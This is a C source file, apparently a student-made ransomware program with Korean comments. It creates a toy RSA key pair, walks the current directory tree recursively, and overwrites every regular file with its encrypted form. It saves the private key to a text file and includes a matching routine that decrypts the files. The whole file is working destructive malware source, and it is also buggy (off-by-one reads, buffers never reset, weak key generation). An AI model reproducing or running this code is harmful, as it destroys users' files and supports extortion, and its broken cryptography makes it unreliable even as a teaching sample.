#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <string.h>
#include <unistd.h>
#include <memory.h>
#include <sys/types.h>
#include <dirent.h>
#include <sys/stat.h>
#include <unistd.h>

void rswr();

void ders(int key, int n);

void listing(char * path,int n,int e);

void createPk(int * p, int * q);

void createE(int P,int * e);

void createD(int e,int * d,int P);

void cryption(char * buffer,int n,int k,char * filename);

int mod(int sum,int n,int key);

int * ma();

int formatCk();

void getFirstPath();

char dec(int enbuffer,int key,int n);

void delisting(char * path,int n,int key);

char buffer[20000],debuffer[20000],tempbuffer[20000];

char firstpath[1024];

int  enbuffer;




int main(int argc, char * argv[]){
	int key,n;
	
	
	if(argc == 1){
		rswr();
		
	}else if(argc == 3){
		if(argv[1] == NULL && argv[2] == NULL){
			printf("no key value");
			return -1;
	}
		key = atoi(argv[1]);
		n = atoi(argv[2]);
		ders(key,n);
		
	}else{
		printf("Error 1");
		return -1;
	}
	
}//main 



void ders(int key, int n){
	
	FILE *fp,*dfp;
	char filename[20];
	

	
	char path[30] = "./";
	getFirstPath();
	
	delisting(path,n,key);
	
	
	
	return;
}


void delisting(char * path,int n,int key){
	int x =0;
	DIR * dp = NULL;
	struct dirent * entry = NULL;
	char pwd[1024];
	getcwd(pwd,sizeof(pwd));
	
	
	printf("current path:%s\n",pwd);
	
	if((dp=opendir(path)) == NULL){
		printf("noPath\n");
		return;
	}
	
	while((entry = readdir(dp)) != NULL){ 
		FILE * fp,*dfp;
		x =0;
		memset(debuffer,0,sizeof(debuffer));
		printf("1.buffer:%s\n",debuffer);
		struct stat buf ;

		lstat(entry->d_name,&buf);
		
		if(S_ISDIR(buf.st_mode)){
			if(!strcmp(entry->d_name,".")){
				
			}else if(!strcmp(entry->d_name,"..")){
				
			}else{
				printf("[D]%s\n",entry->d_name);
				chdir(entry->d_name);
				listing(path,n,key);
			}
		}else if(S_ISREG(buf.st_mode)){
			if(!strcmp(entry->d_name,"ransomeware")){
				
			}else{
				printf("[F]%s\n",entry->d_name);
				fp = fopen(entry->d_name,"r"); 
			
				while(!feof(fp)){
					fscanf(fp,"%d",&enbuffer);
					debuffer[x] = dec(enbuffer,key,n);
					x++;
				}
				printf("2.buffer:%s\n",debuffer);
				fclose(fp);
				
				dfp = fopen(entry->d_name,"w");
	
				fprintf(dfp,"%s",debuffer);
	
				fclose(dfp);
	
				
			}
		}
	}
	
	if(!strcmp(firstpath,pwd)){
		
	}else{	
		chdir("../");
		
		closedir(dp);
		getcwd(pwd,sizeof(pwd));
		printf("current path:%s\n",pwd);
	}	
	
	
}

char dec(int enbuffer,int key,int n){
	
	int t = enbuffer;
	char buffer = 0 ;
	for(int i = 1;i<key;i++){
		t *= enbuffer;
		t %= n;
	}
	
	buffer = (char)t;
	
	return buffer;
	
}



void rswr(){
	
	int p,q;
	int n;
	int P=0;
	int e,d =0;


	FILE *pk;
	
	
	createPk(&p,&q);	
	
	printf("두개의 소수 p,q : %d,%d\n",p,q);

	n = p*q;
	P = (p-1) * (q-1);
	
	
	
	createE(P,&e);
	
	printf("e : %d\n",e);
	
	createD(e,&d,P);
	
	
	
	
	printf("d : %d\n",d); 
	char path[30] = "./";
	getFirstPath();
	
	listing(path,n,e);
	
	pk = fopen("privatekey.txt","w");
	
	fprintf(pk,"%d\n",d);
	fprintf(pk,"%d\n",n);
	
	fclose(pk);
	
	return;
	
}


int mod(int sum,int n,int key){
	long l = sum;
	for(int j =1;j<key;j++){
		
		l *= sum;
		l %= n;
		
	}
	return l;
	
}


void cryption(char * buffer,int n,int k,char * filename){
	int z = 0;
	int * encbuffer = ma();
	FILE * enfp;
	
	

	enfp = fopen(filename,"w");
	char enbu[200];
	for(int i =0;i<strlen(buffer);i++){
		
		encbuffer[i] = (int)mod(buffer[i+1],n,k);
		sprintf(enbu,"%d",encbuffer[i]);
		fprintf(enfp,"%s\n",enbu);
	}
		fclose(enfp);
	
	return;
}



void createD(int e,int * d,int P){
	
	
	int de = 1;
	
	while((de*e)%P != 1)de++;
	
	*d = de;
	
	
	
	
}

void createE(int P,int * e){
	
	int i,j,temp=1;
	
	for(i=2;i<P;i++){ // 0<e<P일때 e와 P의 최소 공배수가 1인 숫자를 찾는 반복문
		
		for(j=1;j<=i;j++){
			
			if(P%j==0 && i%j==0)temp=j;
			//나머지가 0인 경우 temp에 j를 대입
			
		}
		if(temp == 1){ //j의 모든 반복문에 대해 1밖에 대입 안된 경우가 성공
			*e = i;
			break;
		}
		
		temp=1;
		
	}
	
}

void createPk(int * p, int * q){ //1000 이하의 소수 2개를 구하는 함수
	int i,j,k;
	int ck1,ck2 =0;
	int random[2];
	//렌덤으로 숫자를 정함
	for(k = 0;k<2;k++){
		srand((unsigned)time(NULL));
		printf("creat key...\n");
		sleep(2);
		random[k] = (rand() % 100); 
		for(i = random[k];1;i++){ //숫자를 1씩 증가시켜 소수를 찾는 반복문
			ck1 = 0;
			for(j = 2;j<i/2+1;j++){ //렌덤 i에 대해서 나눠지는 숫자를 찾는 반복문
				
				if(i%j == 0){ //나머지가 0일 경우 소수가 아니기 때문에 반복문 즉시 종료
						ck1 = 0;
						break;
					}
		
				ck1 = 1;
				
			
			}
			if(ck1 == 1 && ck2 == 0){
				*p = i;
				ck2 = 1;
			}
			
			if(ck1 == 1 && ck2 == 1){
				*q = i;
				break;
			}
			
			
		
		}
	}
	
	return;
	
}

void getFirstPath(){
	
	
	getcwd(firstpath,sizeof(firstpath));
	
}


void listing(char * path,int n,int e){
	

	DIR * dp = NULL;
	struct dirent * entry = NULL;
	char pwd[1024];
	getcwd(pwd,sizeof(pwd));
	
	FILE * fp ;
	printf("Current path:%s\n",pwd);
	
	if((dp=opendir(path)) == NULL){
		printf("NoPath\n");
		return;
	}
	
	while((entry = readdir(dp)) != NULL){ //파일 리스팅 및 암호화 작업 해당 파일이 디렉터리일 경우 해당 디렉터리도 리스팅 후 암호화
		struct stat buf ;

		lstat(entry->d_name,&buf);
		
		if(S_ISDIR(buf.st_mode)){
			if(!strcmp(entry->d_name,".")){
				
			}else if(!strcmp(entry->d_name,"..")){
				
			}else{
				printf("[D]%s\n",entry->d_name);
				chdir(entry->d_name);
				listing(path,n,e);
			}
		}else if(S_ISREG(buf.st_mode)){
			if(!strcmp(entry->d_name,"ransomeware")){
				
			}else{
				printf("[F]%s\n",entry->d_name);
				fp = fopen(entry->d_name,"r"); //암호화 시작
			
				while(!feof(fp)){
					memset(tempbuffer,0,sizeof(tempbuffer));
					fgets(tempbuffer, 20000,fp);
					strcat(buffer,tempbuffer);
				}
	
				fclose(fp);
	
				
	
				cryption(buffer,n,e,entry->d_name); //암호화 끝
			}
		}
	}
	
	if(!strcmp(firstpath,pwd)){
		
	}else{	
		chdir("../");
		
		closedir(dp);
		getcwd(pwd,sizeof(pwd));
		printf("current path:%s\n",pwd);
	}	
	
}
		  
int * ma(){
	
	int * encbuffer = (int*)malloc(sizeof(int)*20000);
	
	return encbuffer;
	
}

int formatCk(char * filename){
	
	int i = 0;
	
	for(i=0;i<strlen(filename);i++){
		
		if(filename[i] =='.'){
			if(filename[i+1] == 't'){
				if(filename[i+2] == 'x'){
					if(filename[i+3] == 't'){
						return 1;
					}
				}
			}
			
		}
	}
	
	return 0;
	
	
}